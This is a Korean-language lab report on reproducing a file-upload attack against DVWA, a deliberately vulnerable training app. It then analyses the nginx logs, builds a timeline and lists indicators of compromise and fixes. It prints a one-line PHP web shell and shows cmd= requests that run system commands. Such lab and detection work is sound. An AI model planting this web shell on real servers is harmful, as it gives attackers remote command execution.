# Incident 05 - DVWA WebShell Attack Analysis

## 1. 사건 개요

본 분석은 DVWA(Damn Vulnerable Web Application) 환경에서 File Upload 취약점을 이용하여  
WebShell 업로드 및 명령 실행 공격(RCE)을 재현하고, 웹 서버 로그를 기반으로 공격 행위를 분석하기 위한 실습이다.

공격자는 업로드 기능의 검증 미흡을 악용하여 PHP 기반 WebShell을 서버에 업로드하고,  
HTTP 요청을 통해 명령을 전달하여 서버에서 실행할 수 있는 가능성을 확인한다.

본 보고서에서는 공격 재현 과정, 웹 로그 분석, 타임라인 재구성 및 IOC(침해 지표)를 기반으로  
공격 흐름을 분석하였다.

---

## 2. 분석 환경

| 구분 | 환경 |
|------|------|
| Target | RHEL |
| Attacker | Kali Linux |
| Web Server | nginx |
| Web Application | DVWA |
| 주요 로그 | /var/log/nginx/access.log |

---

## 3. 공격 재현 과정

### 3.1 WebShell 업로드

다음 내용을 포함한 PHP 기반 WebShell 파일을 생성하였다.

```php
<?php system($_GET['cmd']); ?>
```

파일명은 `shell.php` 로 저장하였다.

DVWA File Upload 페이지(`/vulnerabilities/upload/`)를 통해 업로드를 수행하였으며, 업로드 성공 메시지를 확인하였다.

![WebShell Upload Page](./evidence/screenshots/01_webshell_upload_page.png)

![WebShell Upload Success](./evidence/screenshots/02_webshell_upload_success.png)

---

### 3.2 명령 실행 (RCE)

업로드된 WebShell 파일에 접근하여 URL 파라미터를 통해 시스템 명령을 실행하였다.

다음과 같은 요청을 통해 명령 실행을 확인하였다.

    http://192.168.200.81/hackable/uploads/shell.php?cmd=id

실행 결과 서버의 사용자 정보가 출력되었으며, 명령이 정상적으로 실행됨을 확인하였다.

![Command Execution - id](./evidence/screenshots/03_rce_id_result.png)

---

추가적으로 다음 명령을 실행하여 현재 실행 계정을 확인하였다.

    http://192.168.200.81/hackable/uploads/shell.php?cmd=whoami

웹 서버 계정(apache)이 출력되었으며, 이는 PHP-FPM 프로세스가 apache 계정으로 실행되고 있음을 의미한다.  
웹 서버는 nginx를 사용하지만, PHP 실행은 별도의 PHP-FPM 프로세스를 통해 이루어지는 구조임을 확인할 수 있다.

![Command Execution - whoami](./evidence/screenshots/04_rce_whoami_result.png)

---

또한 다음 명령을 실행하여 시스템 정보를 확인하였다.

    http://192.168.200.81/hackable/uploads/shell.php?cmd=uname -a

서버의 운영체제 및 커널 정보가 출력되었으며, 추가적인 시스템 정보 수집이 가능함을 확인하였다.

![System Information](./evidence/screenshots/05_rce_uname_result.png)

---

## 4. 웹 로그 분석

### 4.1 Access Log 분석

nginx access log에서 WebShell 업로드 및 명령 실행 요청을 확인하였다.

확인된 주요 로그는 다음과 같다.

```
192.168.200.1 - - [23/Mar/2026:09:15:20 +0900] "POST /vulnerabilities/upload/ HTTP/1.1" 200
192.168.200.1 - - [23/Mar/2026:09:19:35 +0900] "GET /hackable/uploads/shell.php?cmd=id HTTP/1.1" 200
192.168.200.1 - - [23/Mar/2026:10:08:58 +0900] "GET /hackable/uploads/shell.php?cmd=whoami HTTP/1.1" 200
192.168.200.1 - - [23/Mar/2026:10:10:38 +0900] "GET /hackable/uploads/shell.php?cmd=uname%20-a HTTP/1.1" 200
```

HTTP 상태 코드 200이 확인되며, 이는 요청이 정상적으로 처리되었음을 의미한다.  
특히 cmd 파라미터를 포함한 요청은 WebShell을 이용한 명령 실행 시도로 판단할 수 있다.

![Access Log - RCE](./evidence/screenshots/06_access_log_rce.png)

---

## 5. 타임라인 재구성

| 시간 | 이벤트 | 해석 |
|------|--------|------|
| 09:15:20 | WebShell 업로드 | 서버에 실행 가능한 파일 업로드 |
| 09:19:35 | 명령 실행 (id) | 사용자 정보 확인 |
| 10:08:58 | 명령 실행 (whoami) | 실행 계정 확인 |
| 10:10:38 | 시스템 정보 수집 | 시스템 정보 확인 |

---

## 6. IOC (Indicators of Compromise)

| 구분 | 값 | 설명 |
|------|------|------|
| Source IP | 192.168.200.1 | 공격 수행 IP |
| URL | /hackable/uploads/shell.php | 업로드된 WebShell 경로 |
| Parameter | cmd= | 명령 실행 파라미터 |
| Command | id, whoami, uname -a | 실행된 시스템 명령 |
| Pattern | GET /shell.php?cmd= | WebShell 접근 패턴 |
| Directory | /hackable/uploads/ | 업로드 파일 저장 경로 |
| Log File | /var/log/nginx/access.log | 웹 서버 접근 로그 |

---

## 7. 대응 및 개선 방안

### 7.1 파일 업로드 검증 강화
허용된 확장자만 업로드 가능하도록 화이트리스트 기반 검증을 적용해야 한다.

---

### 7.2 업로드 경로 실행 제한
업로드 디렉토리(`/hackable/uploads/`)에서 PHP와 같은 실행 파일이 동작하지 않도록 설정해야 한다.

---

### 7.3 입력값 필터링
URL 파라미터(cmd 등)에 대한 입력값 검증을 수행하여 시스템 명령 실행을 차단해야 한다.

---

### 7.4 웹 로그 모니터링
다음과 같은 비정상적인 요청 패턴을 지속적으로 모니터링해야 한다.

    GET /shell.php?cmd=
    /hackable/uploads/

---

## 8. 결론

본 실습에서는 File Upload 취약점을 이용하여 WebShell을 업로드하고, 이를 통해 원격 명령 실행(Remote Command Execution, RCE)이 가능함을 확인하였다.

특히 단순 파일 업로드 취약점이 실제 서버 침해로 이어질 수 있으며, 공격자는 WebShell을 통해 시스템 명령 실행 및 정보 수집이 가능함을 확인하였다.

따라서 파일 업로드 기능에 대한 보안 설정과 입력값 검증, 그리고 로그 기반 모니터링이 필수적으로 요구됨을 확인할 수 있었다.
